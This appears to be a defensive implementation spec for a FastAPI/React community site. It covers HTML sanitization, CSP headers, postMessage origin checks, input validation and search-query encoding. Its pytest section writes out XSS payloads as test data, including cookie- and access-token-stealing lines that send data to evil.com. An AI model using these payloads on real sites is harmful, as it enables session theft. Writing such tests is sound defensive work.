# Website XSS Prevention & Content Security — Implementation Spec

> **Project:** WalletSavior / Website  
> **Scope:** `packages/website/backend/` (FastAPI) + `packages/website/frontend/src/` (React/Vite)  
> **Date:** 2025-07-16  
> **Source Audits:** `website-code-audit.md` (C-01, C-05, H-01, H-06, H-08, H-10, M-11, M-13) · `website-arch-audit.md` (CRITICAL-02, MEDIUM-01, MEDIUM-02, MEDIUM-04, MEDIUM-06)  
> **Priority:** 🔴 Critical — Must complete before any public deployment

---

## Table of Contents

1. [Stored XSS — DOMPurify + Backend Sanitization](#1-stored-xss--dompurify--backend-sanitization)
2. [Content Security Policy (CSP) Headers](#2-content-security-policy-csp-headers)
3. [Plugin iframe postMessage Origin Validation](#3-plugin-iframe-postmessage-origin-validation)
4. [Input Sanitization Middleware](#4-input-sanitization-middleware)
5. [Image URL Validation](#5-image-url-validation)
6. [Search Query Sanitization](#6-search-query-sanitization)
7. [Test Plan & XSS Payloads](#7-test-plan--xss-payloads)

---

## 1. Stored XSS — DOMPurify + Backend Sanitization

### 1.1 Problem

Community post content (HTML from TipTap rich-text editor) is rendered with `dangerouslySetInnerHTML={{ __html: post.body }}` at `CommunityPage.jsx:775` with **zero sanitization**. The backend stores `title` and `content` verbatim in `community.py:200-201`. Any user can inject `<script>`, `<img onerror=...>`, or `<svg onload=...>` payloads that execute in every viewer's browser.

**Audit References:** Code Audit C-01 (CVSS 9.6), Arch Audit CRITICAL-02

### 1.2 Files to Modify

| Layer | File | Change |
|-------|------|--------|
| Frontend | `frontend/package.json` | Add `dompurify` dependency |
| Frontend | `frontend/src/pages/Community/CommunityPage.jsx` | Wrap all `dangerouslySetInnerHTML` with `DOMPurify.sanitize()` |
| Frontend | `frontend/src/components/community/RichTextEditor.jsx` | Sanitize editor output on submission |
| Backend | `backend/requirements.txt` | Add `nh3>=0.2.15` |
| Backend | `backend/api/routes/community.py` | Sanitize `title`+`content` before storage in `create_post`, `update_post`, `create_comment` |

### 1.3 Frontend — Install DOMPurify

```bash
cd packages/website/frontend
npm install dompurify
```

### 1.4 Frontend — Create Sanitization Utility

**Create file:** `frontend/src/utils/sanitize.js`

```javascript
import DOMPurify from 'dompurify';

// Allowed tags for rich-text community content
const RICH_TEXT_CONFIG = {
  ALLOWED_TAGS: [
    'p', 'br', 'strong', 'em', 'u', 's', 'del',
    'h1', 'h2', 'h3', 'h4',
    'ul', 'ol', 'li',
    'a', 'img',
    'blockquote', 'pre', 'code',
    'table', 'thead', 'tbody', 'tr', 'th', 'td',
    'hr', 'span', 'div',
  ],
  ALLOWED_ATTR: [
    'href', 'title', 'target', 'rel',
    'src', 'alt', 'width', 'height',
    'class', 'style',
  ],
  ALLOW_DATA_ATTR: false,
  // Force safe link attributes
  ADD_ATTR: ['target'],
};

// Strip ALL HTML — for plain-text fields (title, nickname, category)
const PLAIN_TEXT_CONFIG = {
  ALLOWED_TAGS: [],
  ALLOWED_ATTR: [],
};

/**
 * Sanitize rich HTML content (community post body).
 * Defense-in-depth: backend also sanitizes before storage.
 */
export function sanitizeHTML(dirty) {
  if (!dirty) return '';
  const clean = DOMPurify.sanitize(dirty, RICH_TEXT_CONFIG);
  return clean;
}

/**
 * Strip all HTML — for titles, nicknames, categories.
 */
export function stripHTML(dirty) {
  if (!dirty) return '';
  return DOMPurify.sanitize(dirty, PLAIN_TEXT_CONFIG);
}

/**
 * Validate URL: only allow http(s) protocols.
 * Blocks javascript:, data:, vbscript:, etc.
 */
export function sanitizeURL(url) {
  if (!url) return '';
  try {
    const parsed = new URL(url);
    if (!['http:', 'https:'].includes(parsed.protocol)) {
      return '';
    }
    return url;
  } catch {
    return '';
  }
}

// Hook: force all <a> tags to have rel="noopener noreferrer"
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'A') {
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer');
  }
  // Force image sources to http(s) only
  if (node.tagName === 'IMG') {
    const src = node.getAttribute('src') || '';
    if (src && !src.startsWith('https://') && !src.startsWith('http://') && !src.startsWith('data:image/')) {
      node.removeAttribute('src');
    }
  }
});
```

### 1.5 Frontend — Fix CommunityPage.jsx

**File:** `frontend/src/pages/Community/CommunityPage.jsx`

```diff
+ import { sanitizeHTML, sanitizeURL } from '../../utils/sanitize';

  // Line 773-785: Replace dangerouslySetInnerHTML + URL rendering
- {post.body && <div className={`${s.modalContent} ${s.richContent}`}
-   dangerouslySetInnerHTML={{ __html: post.body }} />}
+ {post.body && <div className={`${s.modalContent} ${s.richContent}`}
+   dangerouslySetInnerHTML={{ __html: sanitizeHTML(post.body) }} />}

- {post.url && (
-   <a href={post.url} target="_blank" rel="noopener noreferrer" className={s.dealLink}>
+ {post.url && sanitizeURL(post.url) && (
+   <a href={sanitizeURL(post.url)} target="_blank" rel="noopener noreferrer" className={s.dealLink}>
      🔗 핫딜 링크로 이동
    </a>
  )}

  // Line 785: Validate image URLs
- {post.images?.length > 0 && (
-   <div className={s.modalImages}>
-     {post.images.map((url, i) => <img key={i} src={url} alt="" />)}
-   </div>
- )}
+ {post.images?.length > 0 && (
+   <div className={s.modalImages}>
+     {post.images.filter(url => sanitizeURL(url)).map((url, i) => (
+       <img key={i} src={sanitizeURL(url)} alt="" loading="lazy" />
+     ))}
+   </div>
+ )}
```

**Also apply `sanitizeHTML()` to any other `dangerouslySetInnerHTML` occurrences.** Search the entire frontend:

```bash
grep -rn "dangerouslySetInnerHTML" frontend/src/
```

### 1.6 Backend — Install nh3 (Rust-based HTML sanitizer)

> **Why `nh3` instead of `bleach`?** `bleach` is deprecated (EOL since Jan 2023). `nh3` is its recommended replacement — faster, written in Rust, and actively maintained.

**File:** `backend/requirements.txt` — Add:

```
nh3>=0.2.15
```

```bash
cd packages/website/backend
pip install nh3
```

### 1.7 Backend — Create Sanitization Utility

**Create file:** `backend/api/utils/sanitize.py`

```python
"""
HTML sanitization utilities for user-generated content.
Defense-in-depth: sanitizes BEFORE storage so malicious content
never enters the database.
"""

import re
from urllib.parse import urlparse

import nh3

# Tags allowed in rich-text community post content
RICH_TEXT_TAGS = {
    "p", "br", "strong", "em", "u", "s", "del",
    "h1", "h2", "h3", "h4",
    "ul", "ol", "li",
    "a", "img",
    "blockquote", "pre", "code",
    "table", "thead", "tbody", "tr", "th", "td",
    "hr", "span", "div",
}

# Attributes allowed per tag
RICH_TEXT_ATTRS = {
    "a": {"href", "title", "target", "rel"},
    "img": {"src", "alt", "width", "height"},
    "td": {"colspan", "rowspan"},
    "th": {"colspan", "rowspan"},
    "span": {"class"},
    "div": {"class"},
}

# URL schemes allowed in href/src attributes
ALLOWED_URL_SCHEMES = {"http", "https", "mailto"}


def sanitize_html(dirty: str) -> str:
    """
    Sanitize rich HTML content (community post body).
    Strips all tags/attributes not in the allowlist.
    """
    if not dirty:
        return ""

    clean = nh3.clean(
        dirty,
        tags=RICH_TEXT_TAGS,
        attributes=RICH_TEXT_ATTRS,
        url_schemes=ALLOWED_URL_SCHEMES,
        link_rel="noopener noreferrer",
    )
    return clean


def strip_html(dirty: str) -> str:
    """Strip ALL HTML tags. For plain-text fields: title, nickname, category."""
    if not dirty:
        return ""
    return nh3.clean(dirty, tags=set())


def sanitize_nickname(nickname: str) -> str:
    """
    Allow only Korean, alphanumeric, and underscore characters.
    Strips everything else.
    """
    if not nickname:
        return ""
    # Keep only: Korean syllables, Latin alphanumeric, underscore
    cleaned = re.sub(r"[^가-힣a-zA-Z0-9_]", "", nickname)
    return cleaned[:20]


def validate_url(url: str) -> str | None:
    """
    Validate a URL: must be http or https scheme.
    Returns the URL if valid, None if not.
    """
    if not url:
        return None
    try:
        parsed = urlparse(url)
        if parsed.scheme not in ("http", "https"):
            return None
        if not parsed.netloc:
            return None
        return url
    except Exception:
        return None


def validate_image_url(url: str) -> str | None:
    """
    Validate an image URL. Only http(s) and data:image/* allowed.
    Blocks javascript:, vbscript:, data:text/html, etc.
    """
    if not url:
        return None

    # Allow data:image URIs (from RichTextEditor base64 uploads)
    if url.startswith("data:image/"):
        # Cap data URI size at 5MB encoded
        if len(url) > 5 * 1024 * 1024 * 1.37:  # base64 inflation
            return None
        # Block SVG data URIs (can contain JS)
        if url.startswith("data:image/svg"):
            return None
        return url

    return validate_url(url)
```

### 1.8 Backend — Apply Sanitization to community.py

**File:** `backend/api/routes/community.py`

```diff
+ from api.utils.sanitize import sanitize_html, strip_html, validate_url, validate_image_url

  # ── create_post (Lines ~200-201) ──
  post = PostModel(
      author_id=user["id"],
-     title=body.title,
-     content=body.content,
+     title=strip_html(body.title),
+     content=sanitize_html(body.content),
      custom_category=body.category,
      deal_price=body.price,
-     deal_url=body.url,
+     deal_url=validate_url(body.url) if body.url else None,
  )

  # ── Image storage (Lines ~209-218) ──
  # Before storing images, validate each URL:
+ if body.images:
+     validated = [u for u in body.images if validate_image_url(u)]
+     # store only validated image URLs
+     for url in validated:
+         img = PostImageModel(post_id=post.id, image_url=url)
+         session.add(img)

  # ── update_post (Lines ~254-258) ──
  if body.title is not None:
-     post.title = body.title
+     post.title = strip_html(body.title)
  if body.content is not None:
-     post.content = body.content
+     post.content = sanitize_html(body.content)
+ if body.url is not None:
+     post.deal_url = validate_url(body.url)

  # ── create_comment (Lines ~300-305) ──
  comment = CommentModel(
      post_id=post_id,
      author_id=user["id"],
-     content=body.content,
+     content=strip_html(body.content),  # Comments are plain text
      parent_id=body.parent_id,
  )
```

---

## 2. Content Security Policy (CSP) Headers

### 2.1 Problem

No security headers are set by backend or frontend. Missing CSP enables XSS payload execution. No HSTS, X-Frame-Options, or X-Content-Type-Options headers are present.

**Audit References:** Code Audit H-03, M-11 · Arch Audit MEDIUM-01

### 2.2 Files to Modify

| File | Change |
|------|--------|
| `backend/api/app.py` | Add `SecurityHeadersMiddleware` |
| `backend/api/middleware/security_headers.py` | New file — middleware implementation |
| `frontend/index.html` | Add CSP meta tag for dev mode fallback |

### 2.3 Backend — Create Security Headers Middleware

**Create file:** `backend/api/middleware/security_headers.py`

```python
"""
Security headers middleware.
Sets CSP, HSTS, X-Frame-Options, and other protective headers on every response.
"""

import os

from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request
from starlette.responses import Response


# Environment-driven CSP customization
_EXTRA_CONNECT_SRC = os.getenv("CSP_EXTRA_CONNECT_SRC", "")
_EXTRA_SCRIPT_SRC = os.getenv("CSP_EXTRA_SCRIPT_SRC", "")
_IS_DEV = os.getenv("ENVIRONMENT", "development") == "development"

# ── Content Security Policy ──
# In dev mode, 'unsafe-eval' is needed for Vite HMR; strip it in production.
_SCRIPT_SRC_DEV = "'self' 'unsafe-eval'" if _IS_DEV else "'self'"
_SCRIPT_SRC = f"{_SCRIPT_SRC_DEV} {_EXTRA_SCRIPT_SRC}".strip()

_CSP_DIRECTIVES = {
    "default-src":      "'self'",
    "script-src":       _SCRIPT_SRC,
    "style-src":        "'self' 'unsafe-inline'",      # TipTap editor injects inline styles
    "img-src":          "'self' data: https:",          # data: for base64 editor images
    "font-src":         "'self'",
    "connect-src":      f"'self' https://openapi.naver.com https://map.naver.com {_EXTRA_CONNECT_SRC}".strip(),
    "frame-src":        "https://map.naver.com",       # Naver Maps iframe
    "frame-ancestors":  "'none'",                      # Prevent clickjacking
    "base-uri":         "'self'",
    "form-action":      "'self'",
    "object-src":       "'none'",
    "worker-src":       "'self'",
    "manifest-src":     "'self'",
}

CSP_HEADER_VALUE = "; ".join(f"{k} {v}" for k, v in _CSP_DIRECTIVES.items())


class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    """Adds security headers to every HTTP response."""

    async def dispatch(self, request: Request, call_next) -> Response:
        response: Response = await call_next(request)

        response.headers["Content-Security-Policy"] = CSP_HEADER_VALUE
        response.headers["Strict-Transport-Security"] = (
            "max-age=31536000; includeSubDomains; preload"
        )
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-XSS-Protection"] = "0"  # Deprecated; CSP replaces it
        response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
        response.headers["Permissions-Policy"] = (
            "geolocation=(self), camera=(), microphone=(), payment=(), usb=()"
        )
        response.headers["Cross-Origin-Opener-Policy"] = "same-origin"
        response.headers["Cross-Origin-Resource-Policy"] = "same-origin"

        return response
```

### 2.4 Backend — Register Middleware in app.py

**File:** `backend/api/app.py`

```diff
+ from api.middleware.security_headers import SecurityHeadersMiddleware

  # Register AFTER CORSMiddleware (Starlette applies middlewares bottom-up,
  # so register SecurityHeaders BEFORE CORS so it runs after CORS headers are set)
+ app.add_middleware(SecurityHeadersMiddleware)

  app.add_middleware(
      CORSMiddleware,
      ...
  )
```

### 2.5 Frontend — Dev Mode CSP Meta Tag

**File:** `frontend/index.html` — Add inside `<head>`:

```html
<meta http-equiv="Content-Security-Policy"
  content="default-src 'self';
    script-src 'self' 'unsafe-eval';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    font-src 'self';
    connect-src 'self' http://localhost:8000 https://openapi.naver.com https://map.naver.com;
    frame-src https://map.naver.com;
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
    object-src 'none';">
```

> **Note:** In production, remove `'unsafe-eval'` and `http://localhost:8000`. The backend middleware CSP takes precedence when served through the same origin/nginx.

### 2.6 CSP Header Reference

| Directive | Value | Why |
|-----------|-------|-----|
| `default-src` | `'self'` | Block all resources not explicitly allowed |
| `script-src` | `'self'` | Only same-origin scripts — blocks inline/eval XSS |
| `style-src` | `'self' 'unsafe-inline'` | TipTap editor requires inline styles |
| `img-src` | `'self' data: https:` | Allow base64 editor images + HTTPS images |
| `connect-src` | `'self' https://openapi.naver.com https://map.naver.com` | API calls to self + Naver APIs |
| `frame-src` | `https://map.naver.com` | Only allow Naver Maps iframes |
| `frame-ancestors` | `'none'` | Prevent this site from being iframed (clickjacking) |
| `object-src` | `'none'` | Block Flash/Java/ActiveX |
| `base-uri` | `'self'` | Prevent `<base>` tag hijacking |

---

## 3. Plugin iframe postMessage Origin Validation

### 3.1 Problem

`MessageBridge.js` accepts all origins when `allowedOrigins` is empty (the default). `PluginSDKLoader.js` posts messages to `'*'`. When the source origin is `'null'` (sandboxed iframe), responses go to `'*'`. Combined with `allow-scripts` + `allow-same-origin` in `PluginSandbox.jsx`, a malicious plugin can escape the sandbox and access the host.

**Audit References:** Code Audit C-05 (CVSS 8.5), C-06 (CVSS 8.5), H-10 · Arch Audit MEDIUM-02

### 3.2 Files to Modify

| File | Change |
|------|--------|
| `frontend/src/plugins/sdk/MessageBridge.js` | Fix constructor defaults, `isOriginAllowed`, response targets |
| `frontend/src/plugins/sdk/PluginSDKLoader.js` | Replace `'*'` with specific target origin |
| `frontend/src/plugins/runtime/PluginSandbox.jsx` | Never combine `allow-scripts` + `allow-same-origin` |

### 3.3 Fix MessageBridge.js

**File:** `frontend/src/plugins/sdk/MessageBridge.js`

```diff
  export class MessageBridge {
-   constructor({ targetWindow, targetOrigin = '*', allowedOrigins = [] }) {
+   constructor({ targetWindow, targetOrigin = window.location.origin, allowedOrigins = [window.location.origin] }) {
      this._target = targetWindow;
      this._targetOrigin = targetOrigin;
      this._allowedOrigins = allowedOrigins;
      ...
    }

    /** origin 검증 */
    isOriginAllowed(origin) {
-     if (this._allowedOrigins.length === 0) return true;
+     // SECURITY: Never allow empty allowlist — always require explicit origins
+     if (this._allowedOrigins.length === 0) return false;
      return this._allowedOrigins.includes(origin);
    }

    // Lines 135, 145: Fix response target
    .then((result) => {
      const response = { ... };
-     event.source.postMessage(response, event.origin === 'null' ? '*' : event.origin);
+     // SECURITY: Never post to '*'. For sandboxed iframes (origin 'null'),
+     // use the configured target origin from plugin manifest.
+     const replyOrigin = event.origin === 'null'
+       ? this._targetOrigin
+       : event.origin;
+     event.source.postMessage(response, replyOrigin);
    })
    .catch((err) => {
      const response = { ... };
-     event.source.postMessage(response, event.origin === 'null' ? '*' : event.origin);
+     const replyOrigin = event.origin === 'null'
+       ? this._targetOrigin
+       : event.origin;
+     event.source.postMessage(response, replyOrigin);
    });
```

### 3.4 Fix PluginSDKLoader.js

**File:** `frontend/src/plugins/sdk/PluginSDKLoader.js`

```diff
  function sendRequest(type, payload = {}, timeout = DEFAULT_TIMEOUT) {
    return new Promise((resolve, reject) => {
      const id = generateId();
      ...
      window.parent.postMessage(
        { id, type, payload, direction: 'request', source: 'wallet-savior' },
-       '*'
+       document.referrer ? new URL(document.referrer).origin : window.location.origin
      );
    });
  }
```

> **Note:** `document.referrer` in the iframe contains the parent's URL. When not available, fall back to `window.location.origin`. This ensures messages only go to the known parent origin.

### 3.5 Fix PluginSandbox.jsx — Sandbox Escape Prevention

**File:** `frontend/src/plugins/runtime/PluginSandbox.jsx`

```diff
  function buildSandboxAttr(permissions) {
    const parts = ['allow-scripts'];
-   if (permissions.includes('network:external')) {
-     parts.push('allow-same-origin');
-   }
+   // SECURITY: NEVER combine allow-scripts + allow-same-origin.
+   // Per HTML spec, this allows the iframe to remove its own sandbox.
+   // Plugins requiring network access should use a proxy API instead.
    if (permissions.includes('write:preferences')) {
      parts.push('allow-forms');
    }
    return parts.join(' ');
  }
```

> **If plugins absolutely need `allow-same-origin`:** Serve plugin content from a **separate origin** (e.g., `plugins.walletsavior.local:5174`) so that `allow-same-origin` grants access to the plugin's origin, not the host's.

---

## 4. Input Sanitization Middleware

### 4.1 Problem

No backend fields are sanitized. Titles, content, nicknames, categories, and URLs are stored verbatim. Nickname validation only checks length (2-20 chars) — `<img onerror=...>` passes.

**Audit References:** Code Audit H-01, H-06 · Arch Audit MEDIUM-06

### 4.2 Files to Modify

| File | Change |
|------|--------|
| `backend/api/schemas/community.py` | Add `max_length`, `Field` constraints, and validators |
| `backend/api/schemas/auth.py` | Add regex pattern for nickname |
| `backend/api/utils/sanitize.py` | Already created in §1.7 |
| `backend/api/utils/__init__.py` | Create empty init |

### 4.3 Fix Community Schemas

**File:** `backend/api/schemas/community.py`

```diff
- from pydantic import BaseModel
+ from pydantic import BaseModel, Field, field_validator
+ from api.utils.sanitize import strip_html, sanitize_html, validate_url

  class PostCreate(BaseModel):
-     title: str
-     content: str
+     title: str = Field(..., min_length=1, max_length=200)
+     content: str = Field(..., min_length=1, max_length=50_000)
      post_type: PostType = PostType.FREE
-     category: Optional[str] = None
-     price: Optional[float] = None
+     category: Optional[str] = Field(None, max_length=50)
+     price: Optional[float] = Field(None, ge=0, le=100_000_000)
      original_price: Optional[float] = None
-     url: Optional[str] = None
-     images: Optional[list] = None
+     url: Optional[str] = Field(None, max_length=2048)
+     images: Optional[list[str]] = Field(None, max_length=10)
+
+     @field_validator("url")
+     @classmethod
+     def validate_url_scheme(cls, v):
+         if v is not None:
+             result = validate_url(v)
+             if result is None:
+                 raise ValueError("URL은 http:// 또는 https://로 시작해야 합니다")
+         return v

  class PostUpdate(BaseModel):
-     title: Optional[str] = None
-     content: Optional[str] = None
-     category: Optional[str] = None
-     price: Optional[float] = None
-     url: Optional[str] = None
+     title: Optional[str] = Field(None, max_length=200)
+     content: Optional[str] = Field(None, max_length=50_000)
+     category: Optional[str] = Field(None, max_length=50)
+     price: Optional[float] = Field(None, ge=0, le=100_000_000)
+     url: Optional[str] = Field(None, max_length=2048)

  class CommentCreate(BaseModel):
-     content: str
+     content: str = Field(..., min_length=1, max_length=5_000)
      parent_id: Optional[int] = None
```

### 4.4 Fix Auth Schema — Nickname Validation

**File:** `backend/api/schemas/auth.py`

```diff
+ import re

  @field_validator("nickname")
  @classmethod
  def validate_nickname(cls, v):
      if len(v) < 2 or len(v) > 20:
          raise ValueError("닉네임은 2-20자여야 합니다")
+     if not re.match(r'^[가-힣a-zA-Z0-9_]+$', v):
+         raise ValueError("닉네임은 한글, 영문, 숫자, 밑줄(_)만 사용할 수 있습니다")
      return v
```

### 4.5 Create utils `__init__.py`

**Create file:** `backend/api/utils/__init__.py`

```python
```

---

## 5. Image URL Validation

### 5.1 Problem

Image URLs for posts are stored as raw strings. The RichTextEditor converts images to `data:` base64 URLs with no size or MIME validation. `data:image/svg+xml` can embed JavaScript. No server-side URL scheme validation exists.

**Audit References:** Arch Audit LOW-03, Code Audit H-02

### 5.2 Files to Modify

| File | Change |
|------|--------|
| `frontend/src/components/community/RichTextEditor.jsx` | Add file size/type validation |
| `backend/api/routes/community.py` | Validate image URLs before storage (covered in §1.8) |
| `backend/api/utils/sanitize.py` | `validate_image_url()` already created in §1.7 |

### 5.3 Fix RichTextEditor.jsx — File Upload Validation

**File:** `frontend/src/components/community/RichTextEditor.jsx`

```diff
  // Image upload handler (around line 29-43)
+ const MAX_IMAGE_SIZE = 5 * 1024 * 1024; // 5MB
+ const ALLOWED_IMAGE_TYPES = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];

  const handleImageUpload = (file) => {
+   if (file.size > MAX_IMAGE_SIZE) {
+     alert('이미지 크기는 5MB 이하만 가능합니다');
+     return;
+   }
+   if (!ALLOWED_IMAGE_TYPES.includes(file.type)) {
+     alert('지원하지 않는 이미지 형식입니다 (JPEG, PNG, GIF, WebP만 가능)');
+     return;
+   }
    const reader = new FileReader();
    reader.onload = () => {
      editor.chain().focus().setImage({ src: reader.result }).run();
    };
    reader.readAsDataURL(file);
  };
```

### 5.4 Backend Image URL Validation in community.py

Already covered in §1.8 — the `validate_image_url()` function from `sanitize.py` is called before storing each image URL. It:
- Rejects `javascript:`, `vbscript:`, `data:text/*` schemes
- Allows only `http://`, `https://`, and `data:image/*` (except SVG)
- Caps data URI size at ~5MB

---

## 6. Search Query Sanitization

### 6.1 Problem

User-supplied search queries in `naver_local.py:236` are directly interpolated into Naver URLs and passed to Playwright `page.goto()`. No URL encoding, no length limit, no character validation. Queries with URL-special characters, `javascript:`, or path traversal can manipulate browser behavior.

**Audit References:** Code Audit H-08 · Arch Audit MEDIUM-04

### 6.2 Files to Modify

| File | Change |
|------|--------|
| `backend/api/routes/naver_local.py` | Sanitize and encode query before URL construction |

### 6.3 Fix naver_local.py — Query Sanitization

**File:** `backend/api/routes/naver_local.py`

```diff
+ import re
+ from urllib.parse import quote

+ # Maximum query length
+ MAX_QUERY_LENGTH = 100
+
+ # Allowed characters: Korean, Latin, digits, common punctuation, spaces
+ QUERY_PATTERN = re.compile(r'^[\w가-힣\s,.\-()]+$')
+
+ def sanitize_search_query(query: str) -> str:
+     """Sanitize and validate search query for Naver scraping."""
+     query = query.strip()
+     if len(query) > MAX_QUERY_LENGTH:
+         raise HTTPException(400, f"검색어는 {MAX_QUERY_LENGTH}자 이하여야 합니다")
+     if len(query) == 0:
+         raise HTTPException(400, "검색어를 입력해주세요")
+     if not QUERY_PATTERN.match(query):
+         raise HTTPException(400, "검색어에 허용되지 않는 문자가 포함되어 있습니다")
+     return query

  # Line ~236: Search URL construction
- url = f"https://map.naver.com/p/search/{query}"
+ validated_query = sanitize_search_query(query)
+ url = f"https://map.naver.com/p/search/{quote(validated_query)}"

  # Line ~384: Subcategory search
- query = f"{location} {subcategory}"
+ sanitized_location = sanitize_search_query(location)
+ sanitized_subcategory = sanitize_search_query(subcategory)
+ query = f"{sanitized_location} {sanitized_subcategory}"
+ url = f"https://map.naver.com/p/search/{quote(query)}"
```

---

## 7. Test Plan & XSS Payloads

### 7.1 Unit Test: Backend Sanitization

**Create file:** `backend/tests/test_sanitize.py`

```python
"""
Tests for HTML sanitization utilities.
Covers stored XSS prevention, URL validation, and nickname sanitization.
"""

import pytest
from api.utils.sanitize import (
    sanitize_html,
    strip_html,
    sanitize_nickname,
    validate_url,
    validate_image_url,
)


class TestSanitizeHTML:
    """Test rich-text HTML sanitization (post body)."""

    def test_allows_safe_html(self):
        safe = "<p>Hello <strong>world</strong></p>"
        assert sanitize_html(safe) == safe

    def test_allows_links(self):
        html = '<a href="https://example.com">link</a>'
        result = sanitize_html(html)
        assert "https://example.com" in result
        assert "noopener" in result

    def test_allows_images(self):
        html = '<img src="https://example.com/img.jpg" alt="photo">'
        result = sanitize_html(html)
        assert "https://example.com/img.jpg" in result

    def test_allows_lists(self):
        html = "<ul><li>Item 1</li><li>Item 2</li></ul>"
        assert "<li>" in sanitize_html(html)

    # ── XSS Payload Tests ──

    def test_strips_script_tag(self):
        xss = '<script>alert("XSS")</script>'
        result = sanitize_html(xss)
        assert "<script>" not in result
        assert "alert" not in result

    def test_strips_onerror_handler(self):
        xss = '<img src=x onerror="alert(1)">'
        result = sanitize_html(xss)
        assert "onerror" not in result

    def test_strips_onload_handler(self):
        xss = '<svg onload="alert(1)">'
        result = sanitize_html(xss)
        assert "onload" not in result
        assert "<svg" not in result  # svg not in allowed tags

    def test_strips_onmouseover(self):
        xss = '<b onmouseover="alert(1)">hover me</b>'
        result = sanitize_html(xss)
        assert "onmouseover" not in result

    def test_strips_javascript_href(self):
        xss = '<a href="javascript:alert(1)">click</a>'
        result = sanitize_html(xss)
        assert "javascript:" not in result

    def test_strips_data_uri_in_href(self):
        xss = '<a href="data:text/html,<script>alert(1)</script>">click</a>'
        result = sanitize_html(xss)
        assert "data:" not in result

    def test_strips_event_handler_case_insensitive(self):
        xss = '<img src=x oNeRrOr="alert(1)">'
        result = sanitize_html(xss)
        assert "onerror" not in result.lower()

    def test_strips_nested_script(self):
        xss = '<div><p><script>document.cookie</script></p></div>'
        result = sanitize_html(xss)
        assert "<script>" not in result

    def test_strips_iframe(self):
        xss = '<iframe src="https://evil.com"></iframe>'
        result = sanitize_html(xss)
        assert "<iframe" not in result

    def test_strips_style_expression(self):
        xss = '<div style="background:url(javascript:alert(1))">text</div>'
        result = sanitize_html(xss)
        assert "javascript:" not in result

    def test_strips_svg_script(self):
        xss = '<svg><script>alert(1)</script></svg>'
        result = sanitize_html(xss)
        assert "<script>" not in result

    def test_strips_base64_script_img(self):
        xss = '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIj48L3N2Zz4=">'
        result = sanitize_html(xss)
        # Should either strip the src or the entire tag
        assert "onload" not in result or "data:image/svg" not in result

    def test_strips_meta_refresh(self):
        xss = '<meta http-equiv="refresh" content="0;url=https://evil.com">'
        result = sanitize_html(xss)
        assert "<meta" not in result

    def test_strips_object_tag(self):
        xss = '<object data="https://evil.com/malware.swf"></object>'
        result = sanitize_html(xss)
        assert "<object" not in result

    def test_strips_embed_tag(self):
        xss = '<embed src="https://evil.com/malware.swf">'
        result = sanitize_html(xss)
        assert "<embed" not in result

    def test_strips_form_tag(self):
        xss = '<form action="https://evil.com"><input type="submit"></form>'
        result = sanitize_html(xss)
        assert "<form" not in result

    def test_empty_input(self):
        assert sanitize_html("") == ""
        assert sanitize_html(None) == ""

    def test_cookie_theft_payload(self):
        xss = '<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">'
        result = sanitize_html(xss)
        assert "onerror" not in result
        assert "document.cookie" not in result

    def test_localstorage_theft_payload(self):
        xss = '<img src=x onerror="new Image().src=\'https://evil.com?t=\'+localStorage.getItem(\'access_token\')">'
        result = sanitize_html(xss)
        assert "onerror" not in result
        assert "localStorage" not in result

    def test_mutation_xss_payload(self):
        """Test mXSS — content that becomes dangerous after DOM re-parsing."""
        xss = '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>'
        result = sanitize_html(xss)
        assert "onerror" not in result


class TestStripHTML:
    """Test plain-text stripping (title, comments)."""

    def test_strips_all_tags(self):
        assert strip_html("<b>bold</b>") == "bold"

    def test_strips_script(self):
        result = strip_html('<script>alert(1)</script>test')
        assert "<script>" not in result
        assert "test" in result

    def test_strips_nested_html(self):
        html = "<div><p><em>text</em></p></div>"
        assert strip_html(html) == "text"

    def test_preserves_plain_text(self):
        assert strip_html("Hello world 안녕하세요") == "Hello world 안녕하세요"

    def test_empty_input(self):
        assert strip_html("") == ""
        assert strip_html(None) == ""


class TestSanitizeNickname:
    """Test nickname character restrictions."""

    def test_allows_korean(self):
        assert sanitize_nickname("지갑수호자") == "지갑수호자"

    def test_allows_english(self):
        assert sanitize_nickname("WalletUser") == "WalletUser"

    def test_allows_underscore(self):
        assert sanitize_nickname("user_name") == "user_name"

    def test_allows_digits(self):
        assert sanitize_nickname("user123") == "user123"

    def test_strips_html_tags(self):
        assert sanitize_nickname("<script>alert</script>") == "scriptalertscript"

    def test_strips_special_chars(self):
        assert sanitize_nickname("user<>\"'&") == "user"

    def test_strips_xss_in_nickname(self):
        # This XSS payload should be neutered
        result = sanitize_nickname('<img/onerror=alert(1) src=x>')
        assert "<" not in result
        assert "onerror" not in result

    def test_truncates_to_20(self):
        long = "a" * 50
        assert len(sanitize_nickname(long)) == 20

    def test_empty_input(self):
        assert sanitize_nickname("") == ""


class TestValidateURL:
    """Test URL scheme validation."""

    def test_allows_https(self):
        assert validate_url("https://example.com") == "https://example.com"

    def test_allows_http(self):
        assert validate_url("http://example.com") == "http://example.com"

    def test_rejects_javascript(self):
        assert validate_url("javascript:alert(1)") is None

    def test_rejects_data(self):
        assert validate_url("data:text/html,<script>alert(1)</script>") is None

    def test_rejects_vbscript(self):
        assert validate_url("vbscript:MsgBox") is None

    def test_rejects_empty_netloc(self):
        assert validate_url("https://") is None

    def test_rejects_empty_string(self):
        assert validate_url("") is None

    def test_rejects_none(self):
        assert validate_url(None) is None

    def test_rejects_ftp(self):
        assert validate_url("ftp://example.com/file") is None


class TestValidateImageURL:
    """Test image URL validation (http/https + data:image/*)."""

    def test_allows_https_image(self):
        url = "https://cdn.example.com/photo.jpg"
        assert validate_image_url(url) == url

    def test_allows_data_jpeg(self):
        url = "data:image/jpeg;base64,/9j/4AAQ..."
        assert validate_image_url(url) == url

    def test_allows_data_png(self):
        url = "data:image/png;base64,iVBOR..."
        assert validate_image_url(url) == url

    def test_rejects_data_svg(self):
        """SVG can contain embedded JavaScript."""
